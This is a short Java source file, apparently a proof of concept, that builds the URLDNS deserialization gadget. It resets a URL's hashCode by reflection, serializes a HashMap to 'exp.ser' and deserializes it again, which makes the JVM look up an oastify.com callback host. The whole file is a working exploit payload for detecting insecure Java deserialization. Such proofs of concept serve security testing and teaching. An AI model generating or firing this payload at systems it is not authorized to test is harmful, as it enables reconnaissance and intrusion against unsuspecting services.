import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws Exception {
        exp("http://pb4aigsoksbbwa6894892fa00r6hu6.oastify.com");
    }

    public static void exp(String exp_url) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL(exp_url);
        Class<?> clazz = Class.forName("java.net.URL");
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url, 2333);
        map.put(url, 2333);
        field.set(url, -1);
        try {
            FileOutputStream outputStream = new FileOutputStream("exp.ser");
            ObjectOutputStream outputStream_writeFile = new ObjectOutputStream(outputStream);
            outputStream_writeFile.writeObject(map);
            outputStream.close();
            outputStream_writeFile.close();
            FileInputStream inputStream = new FileInputStream("exp.ser");
            ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
            objectInputStream.readObject();
            objectInputStream.close();
            inputStream.close();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
